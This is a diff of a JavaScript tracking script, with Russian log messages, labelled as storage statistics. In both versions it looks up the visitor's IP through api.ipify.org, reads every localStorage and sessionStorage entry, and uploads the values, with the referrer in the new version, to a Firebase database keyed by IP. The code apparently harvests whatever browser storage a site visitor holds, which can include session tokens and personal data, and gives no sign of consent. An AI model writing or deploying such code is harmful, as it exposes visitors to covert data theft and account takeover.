@@ -17,48 +17,11 @@ const firebaseConfig = {
 
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
-console.log("Firebase успешно инициализирован.");
 
-window.__previousStorageSnapshot = {
-    localStorage: {},
-    sessionStorage: {}
-};
+console.log("Firebase успешно инициализирован.");
 
 function sanitizeKey(key) {
     return key.replace(/[.#$/\[\]]/g, "-");
-}
-
-function getLocalStorageSnapshot() {
-    const snapshot = {};
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const sanitizedKey = sanitizeKey(key);
-        snapshot[sanitizedKey] = localStorage.getItem(key);
-    }
-    return snapshot;
-}
-
-function getSessionStorageSnapshot() {
-    const snapshot = {};
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        const sanitizedKey = sanitizeKey(key);
-        snapshot[sanitizedKey] = sessionStorage.getItem(key);
-    }
-    return snapshot;
-}
-
-function compareSnapshots(oldSnap, newSnap) {
-    const oldKeys = Object.keys(oldSnap);
-    const newKeys = Object.keys(newSnap);
-
-    if (oldKeys.length !== newKeys.length) return true;
-
-    for (let key of newKeys) {
-        if (newSnap[key] !== oldSnap[key]) return true;
-    }
-
-    return false;
 }
 
 async function collectStorageStatistics() {
@@ -68,55 +31,53 @@ async function collectStorageStatistics() {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
+        console.log("IP пользователя:", userIP);
+
         const validUserIP = sanitizeKey(userIP);
+        const userRef = database.ref(`statistics/${validUserIP}`);
+
+        const snapshot = await userRef.get();
+        const existingData = snapshot.exists() ? snapshot.val() : { localStorage: {}, sessionStorage: {}, referrer: null };
+        console.log("Текущие данные:", existingData);
+
+        const localStorageData = {};
         const timestamp = new Date().toISOString();
 
-        const currentLocalSnap = getLocalStorageSnapshot();
-        const currentSessionSnap = getSessionStorageSnapshot();
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const sanitizedKey = sanitizeKey(key);
 
-        const localChanged = compareSnapshots(window.__previousStorageSnapshot.localStorage, currentLocalSnap);
-        const sessionChanged = compareSnapshots(window.__previousStorageSnapshot.sessionStorage, currentSessionSnap);
-
-        if (!localChanged && !sessionChanged) {
-            console.log("Локально: данные не изменились, обновление не требуется.");
-            return;
-        }
-
-        const userRef = database.ref(`statistics/${validUserIP}`);
-        const snapshot = await userRef.get();
-        const existingData = snapshot.exists() ? snapshot.val() : { localStorage: {}, sessionStorage: {} };
-
-        const updatedLocalData = { ...existingData.localStorage };
-        for (const key in currentLocalSnap) {
-            const value = currentLocalSnap[key];
-            updatedLocalData[key] = {
-                value,
-                firstSeen: existingData.localStorage?.[key]?.firstSeen || timestamp,
+            localStorageData[sanitizedKey] = {
+                value: localStorage.getItem(key),
+                firstSeen: existingData.localStorage?.[sanitizedKey]?.firstSeen || timestamp,
                 lastUpdated: timestamp
             };
         }
+        console.log("localStorage:", localStorageData);
 
-        const updatedSessionData = {};
-        for (const key in currentSessionSnap) {
-            const value = currentSessionSnap[key];
-            updatedSessionData[key] = {
-                value,
+        const sessionStorageData = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const sanitizedKey = sanitizeKey(key);
+
+            sessionStorageData[sanitizedKey] = {
+                value: sessionStorage.getItem(key),
                 recorded: timestamp
             };
         }
+        console.log("sessionStorage:", sessionStorageData);
 
-        await userRef.update({
-          lastUpdated: timestamp,
-          localStorage: updatedLocalData,
-          sessionStorage: updatedSessionData
+        const referrer = existingData.referrer || document.referrer;
+        console.log("Реферер:", referrer);
+
+        await userRef.set({
+            lastUpdated: timestamp,
+            localStorage: { ...existingData.localStorage, ...localStorageData },
+            sessionStorage: sessionStorageData,
+            referrer
         });
 
-
-        window.__previousStorageSnapshot.localStorage = currentLocalSnap;
-        window.__previousStorageSnapshot.sessionStorage = currentSessionSnap;
-
-        console.log("Данные обновлены в Firebase.");
-
+        console.log("Данные отправлены.");
     } catch (error) {
         console.error("Ошибка при сборе статистики:", error);
     }
